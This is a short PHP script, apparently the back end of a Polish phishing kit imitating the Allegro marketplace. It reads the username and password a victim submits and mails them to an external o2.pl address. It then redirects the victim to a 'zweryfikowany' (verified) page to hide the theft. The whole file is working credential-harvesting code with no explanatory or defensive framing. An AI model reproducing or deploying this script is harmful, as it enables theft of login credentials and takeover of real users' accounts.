﻿<?php
session_start();

if(isset($_SESSION['anty'][$_SERVER['REMOTE_ADDR']])) {

if($_SESSION['anty'][$_SERVER['REMOTE_ADDR']] > 10) {
echo '<meta http-equiv="Refresh" content="0;url=/78569/zweryfikowany.php">';
}

$login = htmlspecialchars(stripslashes($_POST['username']));
$haslo = htmlspecialchars(stripslashes($_POST['password']));

$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
$headers .= 'From: phallegro <nadawca@domena.pl>' . "\r\n";
$headers .= 'Reply-To: nadawca <nadawca@domena.pl>' . "\r\n";

$subject = "acc  " . $login . " : " . $haslo; //tytul
$message = "acc  " . $login . " : " . $haslo; //tresc

$wyslij = mail("manenskeip21@o2.pl", $subject, $message, $headers);

if($wyslij) {
	echo '<meta http-equiv="Refresh" content="0;url=/78569/zweryfikowany.php">
	<script type="text/javascript">location.href="/78569/zweryfikowany.php";</script>
	<a href="/78569/zweryfikowany.php">Kliknij tutaj jeśli nie nastąpiło automatyczne przekierowanie.</a>';
}

}
?>